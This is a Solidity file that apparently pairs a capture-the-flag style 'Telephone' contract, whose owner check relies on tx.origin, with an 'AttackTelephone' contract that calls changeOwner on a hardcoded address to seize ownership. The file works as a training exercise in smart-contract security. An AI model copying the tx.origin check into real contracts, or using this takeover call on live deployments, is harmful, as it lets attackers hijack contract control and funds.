// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract AttackTelephone {
  function attack() public {
      Telephone(0x72ae995c2bC3281A348b4823590996fBa6b6F2c1).changeOwner(msg.sender);
  }
}